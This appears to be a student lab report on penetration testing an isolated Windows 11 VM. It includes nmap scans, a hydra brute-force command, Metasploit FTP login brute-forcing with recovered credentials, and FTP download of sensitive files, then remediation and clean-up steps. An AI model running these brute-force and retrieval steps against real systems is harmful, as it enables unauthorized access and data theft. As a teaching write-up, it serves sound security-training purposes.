...
### 4.1 Port Scanning for Service Identification

**Tool:** Nmap

```bash
# Comprehensive service scan on target
nmap -sV -p- --version-intensity 9 192.168.1.207

# Output shows active services
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41
...
**Services Identified:** 7 active services across standard and high ports

---

### 4.2 Network Service Enumeration

**Method:** Nmap NSE Scripts

```bash
# FTP enumeration
nmap --script ftp-anon,ftp-brute 192.168.1.207 -p 21

# SMB enumeration
nmap --script smb-os-discovery,smb-security-mode 192.168.1.207 -p 445

# HTTP enumeration
nmap --script http-enum,http-headers 192.168.1.207 -p 80
```

**Key Findings:**
- FTP: Anonymous login disabled, version banner exposed
- SMB: Message signing disabled, guest access enabled
- HTTP: Apache 2.4.41, directory listing enabled

---

### 4.3 Vulnerability Scan Report

#### Vulnerability #1: Weak FTP Credentials

**Details:**
- Service: FileZilla FTP Server 0.9.41
- Port: 21/TCP
- Finding: Brute-force attack successful

```bash
# Attack executed
hydra -L users.txt -P rockyou.txt ftp://192.168.1.207
...
**Evidence:** Successfully logged in via FTP client using discovered credentials

---

#### Vulnerability #2: SMB Signing Disabled

**Details:**
- Service: SMB (Microsoft-DS)
- Port: 445/TCP
- Finding: SMB message signing not required

```bash
# Verification
nmap --script smb-security-mode 192.168.1.207 -p 445

# Output shows
Message signing: disabled (dangerous)
```

**Risk:** Man-in-the-middle attacks possible, credential relay attacks feasible

---

#### Vulnerability #3: RDP Exposed to Network

**Details:**
- Service: Microsoft Terminal Services
- Port: 3389/TCP
- Finding: RDP accessible from local network without VPN/jumpbox

```bash
# RDP service detected
nmap -p 3389 --script rdp-enum-encryption 192.168.1.207

# Shows
RDP encryption level: High
But service is network-accessible
```

**Risk:** Brute-force attacks, credential stuffing, potential data interception
...
|---------------|------------|------------|----------------|
| Weak FTP Credentials | 7.5 | HIGH | Easy - automated tools |
| SMB Signing Disabled | 6.5 | MEDIUM | Moderate - MITM required |
| RDP Network Exposure | 7.3 | HIGH | Easy - direct access |
...
**Business Impact:**
- Data breach (confidential files)
- Compliance violations (GDPR, HIPAA)
- Reputational damage

---

#### SMB Signing Disabled Impact
...
- Potential ransomware delivery vector
...
systemctl disable filezilla-server
```
...
**Long-term:**
- Migrate to managed file transfer solutions
- Implement privileged access management (PAM)

---

#### For SMB Signing Disabled
...
New-NetFirewallRule -DisplayName "RDP Admin Only" -Direction Inbound -LocalPort 3389 -Protocol TCP -Action Allow -RemoteAddress 192.168.1.100
```

**Short-term:**
- Implement VPN for remote access
- Use jump server/bastion host
- Enable MFA for RDP sessions

**Long-term:**
- Deploy zero-trust network access (ZTNA)
- Use remote desktop gateway with conditional access
...
### 5.1 Metasploit Framework Setup

**Environment:** Parrot OS (192.168.1.133)
...
msf6 > db_status
[*] Connected to msf: postgresql://msf@127.0.0.1/msf

# Update exploit modules
msf6 > msfupdate
```

**Configuration Complete:** Framework ready for exploitation testing

---

### 5.2 Target Verification & Scope Definition

#### Authorized Testing Scope

**Target System:** Windows 11 Lab VM  
**IP Address:** 192.168.1.207  
**Network:** Isolated lab environment (192.168.1.0/24)  
**Authorization:** Written lab authorization on file

**Pre-Exploitation Verification:**
```bash
# Confirm target is reachable
ping -c 4 192.168.1.207

# Verify services still active
nmap -sV -p 21,445 192.168.1.207
...
**Scope Boundaries:**
- [x] Exploitation permitted on 192.168.1.207
- [] No attacks on 192.168.1.1 (gateway)
- [] No attacks on 192.168.1.100 (host machine)
- [x] Lab VMs only (prefixed with "Lab-")

---

### 5.3 Tool Configuration

#### Exploit Selection: FTP Brute-Force

```bash
# Load auxiliary module for FTP login
...
# Set threading for faster scan
msf6 auxiliary(scanner/ftp/ftp_login) > set THREADS 5

# Enable verbose output
msf6 auxiliary(scanner/ftp/ftp_login) > set VERBOSE true
```

**Configuration Summary:**
- Target: 192.168.1.207:21
- Method: Dictionary attack
- Wordlists: Metasploit default
...
#### Step 1: Launch Exploit

```bash
msf6 auxiliary(scanner/ftp/ftp_login) > run

[*] 192.168.1.207:21 - Starting FTP login sweep
[!] 192.168.1.207:21 - No active DB, unable to track credentials
[-] 192.168.1.207:21 - LOGIN FAILED: admin:admin (Incorrect)
[-] 192.168.1.207:21 - LOGIN FAILED: admin:password (Incorrect)
[-] 192.168.1.207:21 - LOGIN FAILED: admin:123456 (Incorrect)
[+] 192.168.1.207:21 - LOGIN SUCCESSFUL: ftpuser:password123
...
#### Step 3: Enumerate FTP Directory

```bash
ftp> ls
200 Port command successful
150 Opening data channel for directory listing
drwxrwxrwx 1 ftp ftp    0 Oct 15 10:23 documents
drwxrwxrwx 1 ftp ftp    0 Oct 15 10:23 uploads
-rw-rw-rw- 1 ftp ftp 2048 Oct 15 10:24 config.txt
226 Transfer OK

ftp> cd documents
ftp> get sensitive_data.xlsx
```

**Result:** Successfully accessed FTP server and retrieved files
...
**Access Level:** Standard user (ftpuser)  
**Privileges:** Read/write access to FTP directories  
**Files Accessible:** 47 files totaling 23.4 MB

**Sensitive Data Discovered:**
- `documents/employee_roster.xlsx` - PII data
- `documents/passwords.txt` - plaintext credentials
- `uploads/backup_config.zip` - system configuration

**Post-Exploitation Actions:**
```bash
# Download sensitive files for analysis
ftp> get documents/passwords.txt
ftp> get uploads/backup_config.zip

# Upload indicator file to prove access
ftp> put proof_of_compromise.txt
```

**Evidence:** Screenshots saved to `~/evidence/ftp_exploitation/`

---

### 5.6 Safety Guidelines & Ethical Considerations

#### Safety Protocols Followed

**Pre-Exploitation Checklist:**
- Verified lab network isolation (no internet connectivity)
- Confirmed target is lab VM (hostname: Lab-Win11)
- Created VM snapshot before exploitation
- Documented authorization in lab notebook

**During Exploitation:**
- Used non-destructive techniques only
- Avoided DoS conditions (limited to 5 threads)
- No modification of target system files
- Monitored for unintended side effects

**Ethical Boundaries:**
- Exploitation limited to authorized scope
- No attempts on production systems
- Immediately reported findings to instructor
- Did not retain sensitive data beyond lab requirements
...
- Date: October 22, 2025
- Target: Lab-Win11 (192.168.1.207)
- Approved by: [Instructor Name]
- Duration: October 22-29, 2025

---

### 5.7 Lab Containment & Clean-Up

#### Network Isolation Verification

```bash
# Confirm no internet routing
traceroute 8.8.8.8
# Result: No route to host

# Verify network segmentation
ip route show
# Output shows only 192.168.1.0/24 local network

# Check VM network adapter
VBoxManage showvminfo "Lab-Win11" | grep NIC
# Adapter 1: Host-only Adapter (vboxnet0)
```

**Isolation Confirmed:** No external network access possible
...
```bash
# Stop exploitation activities
ftp> quit
221 Goodbye

# Restore VM to pre-exploitation state
VBoxManage snapshot "Lab-Win11" restore "Clean-State-Oct22"

# Verify restoration
nmap -p 21 192.168.1.207
# FTP service responds normally, no artifacts

# Clear attack machine logs
rm -rf ~/evidence/ftp_exploitation/temp_files/
```

#### Clean-Up Checklist

- [x] Closed all active connections to target
- [x] Restored VM from snapshot
- [x] Verified target system integrity
- [x] Archived exploitation logs securely
- [x] Deleted temporary attack files
- [x] Documented all actions in lab notebook
...
Successfully demonstrated basic exploitation techniques using Metasploit Framework against authorized lab target. FTP service vulnerability exploited via credential brute-force attack, resulting in unauthorized access. Exploitation conducted within ethical boundaries with proper containment and clean-up procedures.

#### Technical Details

**Vulnerability Exploited:** Weak FTP authentication  
**Attack Method:** Metasploit auxiliary/scanner/ftp/ftp_login  
**Time to Compromise:** 4 minutes 37 seconds  
**Credentials Obtained:** ftpuser:password123

**Attack Timeline:**
- 14:30 - Metasploit configured
- 14:32 - Brute-force attack initiated
- 14:36 - Valid credentials discovered
- 14:37 - Manual verification completed
- 14:42 - File enumeration performed
- 14:50 - Clean-up procedures executed

#### Impact Assessment

**Severity:** HIGH  
**Risk:** Unauthorized file access, potential data exfiltration  
**Affected Assets:** FTP server containing sensitive documents

#### Remediation Recommendations

1. **Immediate:** Change FTP credentials to complex passwords (16+ characters)
2. **Short-term:** Implement account lockout policy (3 failed attempts)
3. **Long-term:** Migrate from FTP to SFTP with key-based authentication

#### Lessons Learned

- Metasploit provides efficient exploitation capabilities
- Weak credentials remain common vulnerability
- Proper scoping and authorization critical for ethical testing
- Lab isolation prevents unintended production impacts
- Snapshot/restore enables safe experimentation
